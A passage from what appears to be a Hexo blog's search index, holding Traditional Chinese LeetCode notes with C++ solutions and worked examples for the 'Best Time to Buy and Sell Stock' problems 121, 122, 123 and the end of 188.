class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= k; j++) &#123;</span><br><span class="line">        </span><br><span class="line">                dpBuy[j] = <span class="built_in">max</span>(dpBuy[j], dpSell[j<span class="number">-1</span>] - prices[i]);</span><br><span class="line">                dpSell[j] = <span class="built_in">max</span>(dpSell[j], dpBuy[j]+ prices[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dpSell[k];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裏定義了兩個動態規劃陣列 <code>dpBuy</code> 以及 <code>dpSell</code>， <code>dpBuy</code> 代表每一天買入的淨利潤 (基於前一天的利潤減去當前價格)，由於 <code>dpSell</code> 初始化為 0，因此初次買入時淨利潤會是負數 (沒賣出都是虧的)。 <code>dpSell</code> 則代表賣出的最大利潤。</p><p>接著隨著每天價格迭代，交易次數則由 <code>j</code> 去迭代會有多少次買入跟賣出。最後在 <code>dpSell</code> 的最後一個元素將會是在 <code>k</code> 限制下，買入賣出的最大收益值。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/188/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度: $O(n \cdot k)$</p><p>空間複雜度 $O(k)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Hard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>買賣股票的最佳時機III | Hard | LeetCode#123. Best Time to Buy and Sell Stock III</title>
      <link href="/posts/cfc810b0.html"/>
      <url>/posts/cfc810b0.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>這題是股票買賣系列的題目:</p><p><a href="https://leozzmc.github.io/posts/a0e35335.html">121. Best Time to Buy and Sell Stock</a><br><a href="https://leozzmc.github.io/posts/fcfb0850.html">122. Best Time to Buy and Sell Stock II</a><br><a href="https://leozzmc.github.io/posts/96bf11ff.html">188. Best Time to Buy and Sell Stock IV</a><br><a href="https://leozzmc.github.io/posts/c95a58c1.html">309. Best Time to Buy and Sell Stock with Cooldown</a></p><h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/123/question.jpeg"></p><ul><li>題目難度：<code>Hard</code></li><li>題目描述： 給定一個整數陣列 <code>prices</code>，<code>prices[i]</code> 代表第 <code>i</code> 天的股票價格，每一天可以選擇買或賣股票，最多只能交易兩次 (買賣兩次)，請找出最大收益。</li></ul><div class="note info flat"><p>與先前幾題的原則一樣，只能先買後賣，並且不允許同時有多筆交易，手上股票要賣出才能夠繼續買</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始的想法蠻簡單的，就是與前面幾題一樣，假設 <code>prices=[3,4,5,0,0,3,1,4]</code> 那漲跌幅值如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+1 +1 -5 +0 +3 -2 +3</span><br></pre></td></tr></table></figure><p>只要有連續漲幅，就加總起來，並加入到 <code>dp</code> 中，因此會是 <code>dp=&#123;2,3,3&#125;</code> 只要將 <code>dp</code> 排序後取最後兩個元素相加就會是兩次交易的最大收益。</p><blockquote><p>但這想法其實是有問題的</p></blockquote><h2 id="我的解法-錯誤"><a href="#我的解法-錯誤" class="headerlink" title="我的解法 - 錯誤"></a>我的解法 - 錯誤</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">2</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; dp;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> sumIncrease=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt; n; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(prices[i] &gt;= prices[i<span class="number">-1</span>])&#123;</span><br><span class="line">                sumIncrease += prices[i]-prices[i<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">if</span>(i==n<span class="number">-1</span>) dp.<span class="built_in">push_back</span>(sumIncrease);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                dp.<span class="built_in">push_back</span>(sumIncrease);</span><br><span class="line">                sumIncrease =<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(dp.<span class="built_in">begin</span>(), dp.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=dp.<span class="built_in">begin</span>(); it!=dp.<span class="built_in">end</span>(); ++it)&#123;</span><br><span class="line">            cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(dp.<span class="built_in">size</span>() &gt;=<span class="number">2</span>) <span class="keyword">return</span> dp[dp.<span class="built_in">size</span>()<span class="number">-1</span>]+dp[dp.<span class="built_in">size</span>()<span class="number">-2</span>];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(dp.<span class="built_in">size</span>()==<span class="number">1</span>) <span class="keyword">return</span> dp[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這段程式碼使用 <code>sumIncrease</code> 來紀錄股價隨日期增加的金額， <strong>但這並沒有考慮到應該將所有可以分割成的交易加總，而不是單純只選兩段最大增益</strong>，以 <code>prices=[1,2,4,2,5,7,2,4,9,0]</code> 為例，上面程式最後會紀錄三段連續漲幅 <code>dp = &#123;3,5,7&#125;</code> 最後只會挑選出後兩個元素進行加總 <code>12</code>，但正確答案會是 <code>13</code>，會是在股價為 <code>1</code>時買入，股價為 <code>7</code> 時賣出 (此時收益為 <code>6</code>)，第二次交易為股價為 <code>2</code> 時買入，股價為 <code>9</code> 時賣出 (此時收益為 <code>6+7</code>)，因此最終最大收益會是 <code>13</code>，因此上面程式碼忽略了 <strong>非連續遞增子序列多次買賣的狀況</strong> </p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/123/error.jpeg"></p><h2 id="正確解法"><a href="#正確解法" class="headerlink" title="正確解法"></a>正確解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">leftProfit</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">rightProfit</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> minPrice = prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            minPrice = <span class="built_in">min</span>(minPrice, prices[i]);</span><br><span class="line">            leftProfit[i] = <span class="built_in">max</span>(leftProfit[i<span class="number">-1</span>], prices[i] - minPrice);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> maxPrice = prices[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n<span class="number">-2</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            maxPrice = <span class="built_in">max</span>(maxPrice, prices[i]);</span><br><span class="line">            rightProfit[i] = <span class="built_in">max</span>(rightProfit[i+<span class="number">1</span>], maxPrice - prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> maxProfit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            maxProfit = <span class="built_in">max</span>(maxProfit, leftProfit[i] + rightProfit[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> maxProfit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡透過兩種陣列 <code>leftProfit</code> 以及 <code>rightProfit</code> 來個別紀錄一次交易中能獲得的最大利潤，並且之後合併結果。 以下是舉裡說明：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prices = [<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure><p>對於每一天 <code>i</code> 開始紀錄從第 <code>0</code>天到第 <code>i</code>天只進行一次交易的最大利潤。首先初始化 <code>minPrice = prices[0] = 3, leftProfit[0] = 0</code> 接著開始遍歷 <code>prices</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第 1 天 - minPrice = min(3,3) = 3, leftProfit[1] = max(0, 3-3) = 0</span><br><span class="line">第 2 天 - minPrice = min(3,5) = 3, leftProfit[2] = max(0, 5-3) = 2</span><br><span class="line">第 3 天 - minPrice = min(3,0) = 0, leftProfit[3] = max(2, 0-0) = 2</span><br><span class="line">第 4 天 - minPrice = min(0,0) = 0, leftProfit[4] = max(2, 0-0) = 2</span><br><span class="line">第 5 天 - minPrice = min(0,3) = 0, leftProfit[5] = max(2, 3-0) = 3</span><br><span class="line">第 6 天 - minPrice = min(0,1) = 0, leftProfit[6] = max(3, 1-0) = 3</span><br><span class="line">第 7 天 - minPrice = min(0,4) = 0, leftProfit[7] = max(3, 4-0) = 4</span><br><span class="line"></span><br><span class="line">最後 leftProfit = [0, 0, 2, 2, 2, 3, 3, 4]</span><br></pre></td></tr></table></figure><p>對於每一天 <code>i</code>，計算從第 <code>i</code> 天到最後一天只進行一次交易的最大利潤。初始化 <code>maxPrice = prices[n-1] = 4, rightProfit[n-1]=0</code>，接著由右至左迭代 <code>prices</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第 6 天 - maxPrice = max(4,1) = 4, rightProfit[6] = max(0, 4-1) = 3</span><br><span class="line">第 5 天 - maxPrice = max(4,3) = 4, rightProfit[5] = max(3, 4-3) = 3</span><br><span class="line">第 4 天 - maxPrice = max(4,0) = 4, rightProfit[4] = max(3, 4-0) = 4</span><br><span class="line">第 3 天 - maxPrice = max(4,0) = 4, rightProfit[3] = max(4, 4-0) = 4</span><br><span class="line">第 2 天 - maxPrice = max(4,5) = 5, rightProfit[2] = max(4, 5-5) = 4</span><br><span class="line">第 1 天 - maxPrice = max(5,3) = 5, rightProfit[1] = max(4, 5-3) = 4</span><br><span class="line">第 0 天 - maxPrice = max(5,3) = 5, rightProfit[0] = max(4, 5-3) = 4</span><br><span class="line"></span><br><span class="line">最後 rightProfit = [4, 4, 4, 4, 4, 3, 3, 0]</span><br></pre></td></tr></table></figure><p>最後需要合併結果，對於每一天 <code>i</code>，計算 <code>leftProfit[i] + rightProfit[i]</code>，並找出最大值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第 0 天：maxProfit = max(0 + 4) = 4</span><br><span class="line">第 1 天：maxProfit = max(0 + 4) = 4</span><br><span class="line">第 2 天：maxProfit = max(2 + 4) = 6</span><br><span class="line">第 3 天：maxProfit = max(2 + 4) = 6</span><br><span class="line">第 4 天：maxProfit = max(2 + 4) = 6</span><br><span class="line">第 5 天：maxProfit = max(3 + 3) = 6</span><br><span class="line">第 6 天：maxProfit = max(3 + 3) = 6</span><br><span class="line">第 7 天：maxProfit = max(4 + 0) = 6</span><br></pre></td></tr></table></figure><p>因此最大利潤為 <code>6</code></p><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/123/result.jpeg"></p><h2 id="最佳化解法"><a href="#最佳化解法" class="headerlink" title="最佳化解法"></a>最佳化解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> firstBuy = INT_MIN;</span><br><span class="line">        <span class="type">int</span> firstSell = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> secondBuy = INT_MIN;</span><br><span class="line">        <span class="type">int</span> secondSell = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> price: prices)&#123;</span><br><span class="line">            firstBuy = <span class="built_in">max</span>(firstBuy, -price);</span><br><span class="line">            firstSell = <span class="built_in">max</span>(firstSell, firstBuy + price);</span><br><span class="line">            secondBuy = <span class="built_in">max</span>(secondBuy, firstSell - price);</span><br><span class="line">            secondSell = <span class="built_in">max</span>(secondSell, secondBuy + price);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> secondSell;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這個解法最佳化了空間複雜度，從 $O(n)$ 降到 $O(1)$。這裡定義了四個變數</p><p><code>firstBuy</code>: 第一次買入的最大利潤 (為負值，因為要扣除買入成本，上位賣出都不會是賺的)<br><code>firstSell</code>:  第一次賣出的最大利潤<br><code>secondBuy</code>: 第二次買入的最大利潤 (基於第一次的利潤減去當前價格)<br><code>secondSell</code>: 第二次賣出的最大利潤</p><p>迭代完畢 <code>prices</code> 後得到的 <code>secondSell</code> 則會是兩次交易後的最大利潤。</p><h3 id="執行結果-2"><a href="#執行結果-2" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/123/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th>方法</th><th>時間複雜度</th><th>空間複雜度</th><th>分析說明</th></tr></thead><tbody><tr><td>左右分解法</td><td>$O(n)$</td><td>$O(n)$</td><td>透過兩次遍歷計算左、右兩部分的最大利潤，並存入兩個輔助陣列 <code>leftProfit</code> 和 <code>rightProfit</code>。最終合併結果，找出最大利潤。空間使用受限於輔助陣列大小</td></tr><tr><td>動態規劃解法</td><td>$O(n)$</td><td>$O(1)$</td><td>優化空間後的動態規劃只使用常數空間記錄當前狀態，例如 <code>firstBuy</code>、<code>firstSell</code> 等四個變數，直接在遍歷中更新最大利潤。減少了輔助陣列的使用，空間效率更高</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Hard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>買賣股票的最佳時機II | Medium | LeetCode#122. Best Time to Buy and Sell Stock II</title>
      <link href="/posts/fcfb0850.html"/>
      <url>/posts/fcfb0850.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>這題是股票買賣系列的題目:</p><p><a href="https://leozzmc.github.io/posts/a0e35335.html">121. Best Time to Buy and Sell Stock</a><br><a href="https://leozzmc.github.io/posts/cfc810b0.html">123. Best Time to Buy and Sell Stock III</a><br><a href="https://leozzmc.github.io/posts/c95a58c1.html">309. Best Time to Buy and Sell Stock with Cooldown</a></p><h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/122/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目描述： 給定一個整數陣列 <code>prices</code>，<code>prices[i]</code> 代表第 <code>i</code> 天的股票價格，每一天可以選擇買或賣股票，允許當日買在當日立刻賣出，然而任意時間段最多僅能持有一份股票</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題跟 <a href="https://leozzmc.github.io/posts/a0e35335.html">LeetCode-121 Best Time to Buy and Sell Stock</a> 不太一樣的是，這題允許多次交易，所以要求的是， <strong>多筆買賣的總收益要最大化。</strong></p><p>假設今天 <code>prices = &#123;7, 1, 5, 3, 6, 4&#125;</code> 則在股價為 <code>1</code> 時買入，隔天為 <code>5</code> 時賣出，此時收益為 <code>4</code> 然後在隔天股價為 <code>3</code> 的時候再度買入，隔天股價為 <code>6</code> 的時候賣出，此時總收益為 <code>4+3 =7</code></p><div class="note info flat"><p>這題會有個特性，就是跨天數的收益，可以拆解！<br>假設 <code>prices = [1, 3, 2, 5, 4, 6]</code> 則跨多天的最大收益是從 1 買入到 6 賣出，即  <code>6-1 = 5</code> 這其實可以從每一天的股票漲跌幅得到:</p><p><code>1 -&gt; 3</code>: +2<br><code>3 -&gt; 2</code>: -1<br><code>2 -&gt; 5</code>: +3<br><code>5 -&gt; 4</code>: -1<br><code>4 -&gt; 6</code>: +2</p><p>從第一天到最後一天的總漲跌幅為： <code>0 + (+2)+(-1)+(+3)+(-1)+(+2) = 5</code>，另外上面可以看出最大化總收益，就是都買在下面這幾天</p><p><code>1 -&gt; 3</code>: +2<br><code>2 -&gt; 5</code>: +3<br><code>4 -&gt; 6</code>: +2</p><p>總收益: <code>0+2+3+2 = 7</code></p></div><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (prices.<span class="built_in">size</span>() &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> maxProfit =<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt; n; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(prices[i] &gt; prices[i<span class="number">-1</span>])&#123;</span><br><span class="line">                maxProfit += prices[i]-prices[i<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxProfit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡透過變數 <code>maxProfit</code> 紀錄變數，接著開始迭代 <code>prices</code>， 只要今天股價比昨天大，則將差額加入到總收益中，迭代結束後回傳 <code>maxProfit</code></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/122/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度: $O(n)$</p><p>空間複雜度: $O(1)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Dynamic Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>買賣股票的最佳時機 | Easy | LeetCode#121. Best Time to Buy and Sell Stock</title>
      <link href="/posts/a0e35335.html"/>
      <url>/posts/a0e35335.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>這題是股票買賣系列的題目，與他類似的題目會是 </p><p><a href="https://leozzmc.github.io/posts/fcfb0850.html">122. Best Time to Buy and Sell Stock II</a><br><a href="https://leozzmc.github.io/posts/cfc810b0.html">123. Best Time to Buy and Sell Stock III</a><br><a href="https://leozzmc.github.io/posts/96bf11ff.html">188. Best Time to Buy and Sell Stock IV</a><br><a href="https://leozzmc.github.io/posts/c95a58c1.html">309. Best Time to Buy and Sell Stock with Cooldown</a></p><h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/121/question.jpeg"></p><ul><li>題目難度： <code>Easy</code></li><li>題目描述： 給定一個陣列 <code>prices</code>，<code>prices[i]</code> 代表在第 <code>i</code> 天的股票價格。請選一天進買入股票，但在不同天賣出股票 (買賣股票不能在同一天，且須先買股票才能賣股票)，求股票的最大化收益。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始的想法複雜度其實比較高，就是透過一個迴圈來決定買入，透過另一個內部迴圈決定賣出，然後透過一個變數 <code>maxValue</code> 保存第 <code>i</code> 天買入然後第 <code>j</code> 天賣出的的最大股票收益值。但這樣的做法會導致 time limit excceded!</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(prices.<span class="built_in">size</span>() &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> maxValue=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>; j&lt;n; j++)&#123;</span><br><span class="line">                maxValue = <span class="built_in">max</span>(maxValue, prices[j] - prices[i] );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(prices.<span class="built_in">size</span>() &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> minValue = INT_MAX;</span><br><span class="line">        <span class="type">int</span> maxValue = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">            minValue = <span class="built_in">min</span>(minValue, prices[i]);</span><br><span class="line">            maxValue = <span class="built_in">max</span>(maxValue, prices[i] - minValue);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裏在相同迴圈中，在迭代過程中就獲取到了股票最小值，並且透過當前價格扣掉歷史最小股票值，將淨值與 <code>maxValue</code> 進行比較，取大者，則可獲得最大收益值</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/121/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><ul><li>時間複雜度: $O(n)$</li><li>空間複雜度: $O(1)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Dynamic Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最大正方形 | Medium | LeetCode#221. Maximal Square</title>
      <link href="/posts/a4339899.html"/>
      <url>/posts/a4339899.html</url>
      
